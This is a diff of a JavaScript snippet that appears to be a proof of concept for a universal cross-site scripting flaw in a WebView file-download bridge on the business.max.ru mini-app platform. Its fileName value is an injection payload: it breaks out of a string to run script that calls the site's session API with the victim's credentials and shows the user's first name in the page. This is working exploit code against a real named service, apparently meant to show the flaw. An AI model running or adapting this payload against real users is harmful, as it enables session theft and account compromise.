@@ -5,7 +5,7 @@
      new Blob(['UXSS'], {type: 'text/plain'})
    );
  
-fileName: `'+(()=>{let e=document.createElement("mark"),d=String.fromCharCode(47),m="BUSINESS SESSION @"+location.origin+" ";e.id="business-session-status";document.documentElement.prepend(e);if(location.protocol!=="https:"||location.hostname!=="business.max.ru"){e.textContent=m+"target-mismatch";return""}e.textContent=m+"checking";fetch(d+"self"+d+"api"+d+"v1"+d+"user"+d+"auth"+d+"session",{credentials:"include",redirect:"error",headers:{"Accept":"application"+d+"json","X-Session-Scope":"miniapp"}}).then(r=>r.json()).then(j=>{let a=j&&j.success===true&&j.data?j.data.first_name:null;e.textContent=m+(typeof a==="string"?"authenticated="+a:"unavailable")}).catch(()=>{e.textContent=m+"unavailable"});return""})()+'`
+fileName = `'+(()=>{let e=document.createElement("mark"),d=String.fromCharCode(47),m="BUSINESS SESSION @"+location.origin+" ";e.id="business-session-status";document.documentElement.prepend(e);if(location.protocol!=="https:"||location.hostname!=="business.max.ru"){e.textContent=m+"target-mismatch";return""}e.textContent=m+"checking";fetch(d+"self"+d+"api"+d+"v1"+d+"user"+d+"auth"+d+"session",{credentials:"include",redirect:"error",headers:{"Accept":"application"+d+"json","X-Session-Scope":"miniapp"}}).then(r=>r.json()).then(j=>{let a=j&&j.success===true&&j.data?j.data.first_name:null;e.textContent=m+(typeof a==="string"?"authenticated="+a:"unavailable")}).catch(()=>{e.textContent=m+"unavailable"});return""})()+'`
  
  window.WebViewHandler.postEvent(
    'WebAppDownloadFile',
